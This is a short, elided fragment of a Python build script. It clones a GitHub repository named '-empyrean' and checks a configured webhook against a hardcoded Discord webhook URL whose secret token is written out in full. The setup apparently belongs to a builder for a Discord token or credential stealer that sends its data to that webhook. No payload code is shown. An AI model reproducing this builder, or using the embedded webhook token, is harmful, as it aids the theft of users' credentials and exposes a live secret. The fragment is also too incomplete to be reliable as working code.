...
class make_env:
    ...
    def get_src(self) -> None:
        subprocess.run(['git', 'clone', 'https://github.com/MonstrumHD/-empyrean.git'], cwd=self.build_dir)
...
def main() -> None:
    config = get_config()
    if config['webhook'] != "https://discord.com/api/webhooks/"+"1066534123331657758/q-_nfsSfMLNdJ1ssHmteWCxe5xg1WgAKEAu3p0vGEWXW6J3t7th3QxchfQCJW4IdpJvz":
